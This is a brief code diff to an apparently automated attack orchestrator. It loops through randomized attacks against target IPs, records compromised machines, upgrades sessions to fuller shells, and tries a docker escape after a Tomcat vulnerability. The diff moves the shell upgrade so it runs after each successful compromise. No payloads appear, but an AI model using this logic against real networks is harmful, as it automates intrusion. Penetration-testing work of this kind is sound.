@@ -36,9 +36,12 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
 
         attack=list(Attack_DB.attack_dict)
         randomized_attack=random.sample(attack,len(attack))
-
+        """
         if(atk_sess!=None):
             met_sess=mc.upgrade_shell(atk_sess)
+        
+        """
+        
 
 
         if(target_ip in other_subnet):
@@ -126,6 +129,8 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
                     print(f"{C.COL_GREEN}[+] {target_ip} compromised {C.COL_RESET}")
                     compromised_machines.add(target_ip)
                     uncompromised_machines.remove(target_ip)
+
+                    met_sess=mc.upgrade_shell(atk_sess)
                     
                     if(attack_name=="tomcat_server"):
                         print(f"{C.COL_YELLOW} Tomcat_server vulnerability detected, trying docker escape... {C.COL_RESET}")
